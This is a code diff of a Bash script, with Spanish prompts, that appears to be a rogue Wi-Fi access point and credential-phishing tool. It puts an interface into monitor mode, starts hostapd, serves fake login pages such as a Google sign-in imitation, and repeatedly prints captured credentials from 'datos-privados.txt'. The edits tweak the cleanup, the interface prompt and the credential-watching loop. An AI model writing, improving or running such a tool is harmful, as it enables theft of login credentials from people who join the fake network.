@@ -17,7 +17,7 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
-	rm -r assets google-login.ep helper.php index.php jquery-2.2.1.min.js MyPortal.php post.php Roboto-Regular.ttf 2>/dev/null
+	rm -r assets google-login.ep helper.php index.php jquery-2.2.1.min.js MyPortal.php post.php Roboto-Regular.ttf iface 2>/dev/null
 	tput cnorm
 	exit
 }
@@ -73,12 +73,12 @@ function dependencies(){
 }
 
 function getCredentials(){
-	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales...\n${endColour}"
 
 	while true; do
-		if [[ -e "datos-privados.txt" ]]; then
-			echo -e "\t${redCoolour}[!] Se han obtenido credenciales${endColour}"
-		fi; sleep 1
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
+		sleep 1
+		cat datos-privados.txt 2>/dev/null
+		sleep 3; clear
 	done
 }
 
@@ -93,8 +93,8 @@ function startAttack(){
 	for interface in $(cat iface); do
 		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
 		let counter++
-	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interfaz de red a utilizar: ${endColour}" && read myInterface
-	choosed_interface=$(sed ''$myInterface'q;d' iface)
+	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz: ${endColour}" && read choosed_interface
+
 	rm iface 2>/dev/null
 	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar:${endColour} " && read -r use_ssid
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel; tput civis
@@ -117,7 +117,7 @@ function startAttack(){
 	iwconfig $choosed_interface mode monitor
 	ifconfig $choosed_interface up
 	sleep 2
-	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
+	echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
 	hostapd hostapd.conf > /dev/null 2>&1 &
 	sleep 6
 
